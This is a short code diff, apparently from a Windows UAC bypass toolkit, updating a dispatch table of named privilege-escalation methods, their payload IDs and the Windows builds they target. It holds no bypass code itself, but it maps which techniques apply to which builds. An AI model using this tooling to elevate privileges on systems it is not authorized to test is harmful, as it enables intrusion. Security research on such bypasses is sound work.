@@ -4,9 +4,9 @@
 *
 *  TITLE:       METHODS.C
 *
-*  VERSION:     3.00
+*  VERSION:     3.01
 *
-*  DATE:        27 Aug 2018
+*  DATE:        30 Sep 2018
 *
 *  UAC bypass dispatch.
 *
@@ -119,15 +119,15 @@ UCM_API_DISPATCH_ENTRY ucmMethodsDispatchTable[UCM_DISPATCH_ENTRY_MAX] = {
     { MethodCorProfiler, NULL, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
     { MethodCOMHandlers, NULL, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
     { MethodCMLuaUtil, NULL, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
-    { MethodFwCplLua, &WDCallbackType1, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
+    { MethodFwCplLua, &WDCallbackType1, { 7600, 17134 }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
     { MethodDccwCOM, NULL, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
     { MethodVolatileEnv, NULL, { 7600, 16229 }, FUBUKI_ID, FALSE, TRUE, TRUE },
     { MethodSluiHijack, &WDCallbackType1, { 9600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
     { MethodBitlockerRC, NULL, { 7600, 16300 }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
     { MethodCOMHandlers2, NULL, { 7600, MAXDWORD }, FUJINAMI_ID, FALSE, TRUE, TRUE },
-    { MethodSPPLUAObject, NULL, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
+    { MethodSPPLUAObject, NULL, { 7600, 17763 }, FUBUKI_ID, FALSE, TRUE, TRUE },
     { MethodCreateNewLink, NULL, { 7600, 14393 }, FUBUKI_ID, FALSE, FALSE, TRUE },
-    { MethodDateTimeStateWriter, NULL, { 7600, MAXDWORD }, CHIYODA_ID, FALSE, TRUE, TRUE },
+    { MethodDateTimeStateWriter, NULL, { 7600, 17763 }, CHIYODA_ID, FALSE, TRUE, TRUE },
     { MethodAcCplAdmin, NULL, { 7600, 17134 }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE }
 };
 
